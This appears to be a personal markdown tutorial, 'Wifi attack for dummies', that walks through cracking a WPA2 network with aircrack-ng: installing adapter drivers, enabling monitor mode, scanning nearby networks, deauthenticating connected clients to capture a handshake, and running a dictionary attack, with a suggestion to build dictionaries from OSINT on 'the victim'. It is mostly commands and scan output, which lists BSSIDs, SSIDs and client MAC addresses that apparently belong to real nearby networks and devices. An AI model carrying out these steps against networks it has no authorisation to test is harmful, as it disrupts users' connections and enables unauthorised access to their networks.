# Wifi attack for dummies
## Operating System

Pop-OS

## Antenna Device
https://www.amazon.es/dp/B08BHY92R4?ref_=cm_sw_r_apan_dp_6AH65GXRTTNFR8FV7WQQ&language=es-ES

## Steps to follow

* First, we check if the antenna works. We see that with `ip a` it does not work so we install the drivers:

```
sudo apt install git dkms
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
sudo make dkms_install
```

* Let's check:

```
iw list
``` 
* Tutorial source:

https://blog.programster.org/ubuntu-20-04-install-driver-for-piaek-usb-wifi-adapter

* Let's check again:

```
ip a
``` 

## We are going to install the tool we are going to use

```
sudo apt update
sudo apt install aircrack-ng

```
## Let's put the antenna in monitor mode:

```
airmon-ng check kill

ifconfig wlx0013eff5087d down

or

sudo ip link set wlx0013eff5087d down

sudo iw dev wlx0013eff5087d set type monitor
sudo ip link set wlx0013eff5087d up

sudo airmon-ng start wlx0013eff5087d
```

## Wifi networks with 2.4GHz band

```
sudo airodump-ng wlx0013eff5087d
```

* If I want to connect to both bands: 2.4GHz y 5GHz:

```
sudo airodump-ng --band abg wlx0013eff5087d
```


* The lowest the value of the PWR is, the closest the router is. For example, -60 is closer than -60.
* Let's see different Wifi channels, then I choose the bssid to attack, the channel to attack and then I look for the connected clients.
* There are routers with the same ssid and different channels with the same MAC address.


```
 
 F4:69:42:CC:7B:CF  -20        2        1    0   6  130   WPA2 CCMP   PSK  DAENERYS
 F4:69:42:CC:7B:CE  -27        1        0    0  52 1733   WPA2 CCMP   PSK  DAENERYS_PLUS
 74:9D:79:03:C4:4B  -92        1        0    0   6  130   WPA2 CCMP   PSK  vodafoneC44
 6A:D2:FF:A8:A4:27  -92        0        0    0  11  130   WPA2 CCMP   PSK  vodafoneC44
 60:32:B1:2B:0B:8E  -90        1        0    0   4  130   WPA2 CCMP   PSK  vodafone8AA0_EXT
 60:32:B1:2B:0B:6C  -90        0        0    0  11  130   WPA2 CCMP   PSK  MIWIFI_kYXc_EXT
 A0:18:42:1A:53:42  -90        0        0    0  44 1733   WPA2 CCMP   PSK  MIWIFI_5VEj_5G
 7C:DB:98:A9:CA:E5  -90        1        0    0  60 1733   WPA2 CCMP   PSK  MOVISTAR_PLUS_CAD7
 CC:ED:DC:E2:53:F0  -86        2        0    0   1  270   WPA2 CCMP   PSK  KASAKIE0:19:54:42:A0:03  -70        1        0    0  36 1170   WPA2 CCMP   PSK  MIWIFI_b7NJ
 E0:19:54:42:A0:02  -69        3        0    0   6  195   WPA2 CCMP   PSK  MIWIFI_b7NJ
 74:9D:79:03:C4:4B  -92        1        0    0   6  130   WPA2 CCMP   PSK  vodafoneC44
 6A:D2:FF:A8:A4:27  -92        0        0    0  11  130   WPA2 CCMP   PSK  vodafoneC44
 60:32:B1:2B:0B:8E  -90        1        0    0   4  130   WPA2 CCMP   PSK  vodafone8AA0_EXT
 60:32:B1:2B:0B:6C  -90        0        0    0  11  130   WPA2 CCMP   PSK  MIWIFI_kYXc_EXT
 A0:18:42:1A:53:42  -90        0        0    0  44 1733   WPA2 CCMP   PSK  MIWIFI_5VEj_5G
 7C:DB:98:A9:CA:E5  -90        1        0    0  60 1733   WPA2 CCMP   PSK  MOVISTAR_PLUS_CAD7
 CC:ED:DC:E2:53:F0  -86        2        0    0   1  270   WPA2 CCMP   PSK  KASAKI
```

```
sudo airodump-ng -c 6 --bssid F4:69:42:CC:7B:CF wlx0013eff5087d


sudo airodump-ng -c 6 --bssid F4:69:42:CC:7B:CF -w /home/drakarys/cap/cap_10292023 wlx0013eff5087d


sudo airodump-ng -c 6 --bssid F4:69:42:CC:7B:CF -w /home/drakarys/cap/cap_10292023 wlx00c0caabd8e5 --output-format logcsv,csv,netxml
```

* Various channels:

```
sudo airodump-ng --bssid F4:69:42:CC:7B:CF -w /home/drakarys/cap/cap_10292023 wlx0013eff5087d --output-format logcsv,csv,netxml --band abg -c6,52
```

## Let's see the device:

```

 F4:69:42:CC:7B:CF  3C:61:05:EB:65:E6  -41    0 - 6      0       21
 F4:69:42:CC:7B:CF  D4:A6:51:F1:3A:BE  -57    0 - 1     14     4029
 F4:69:42:CC:7B:CF  10:D5:61:6C:19:3A  -57    0 - 1      0        5
 F4:69:42:CC:7B:CF  C0:C9:E3:4B:9D:35  -49    0 - 1      0        2
 F4:69:42:CC:7B:CF  8C:CE:4E:DB:78:51  -37    0 - 6      0      493

 ```

* We can search the MAC address if the device is interesting:

```
D4:A6:51:F1:3A:BE
```

https://aruljohn.com/mac/10D5616C193A

```
8C:CE:4E:DB:78:51
```

https://aruljohn.com/mac/8CCE4EDB7851

```
3C:61:05:EB:65:E6
```

https://aruljohn.com/mac/3C6105EB65E6

## Deauth

* We open another terminal at te same time the other command is running:
	* -a ap
	* -c client
	* -o deauth + number of packages


```
sudo aireplay-ng -0 1 -a F4:69:42:CC:7B:CF -c D4:A6:51:F1:3A:BE wlx0013eff5087d
sudo aireplay-ng -0 1 -a F4:69:42:CC:7B:CF -c 8C:CE:4E:DB:78:51 wlx0013eff5087d
```
* When de device reconnects, we will have a handshake
* If we have a diccionary based of the victim (OSINT), we'll test.
* There are many types of dicionaries on the internet based on de router type or very known passwords.


```
sudo aircrack-ng -w passwd.txt -b F4:69:42:CC:7B:CF handshake-01.cap
```

https://www.aircrack-ng.org/doku.php?id=deauthentication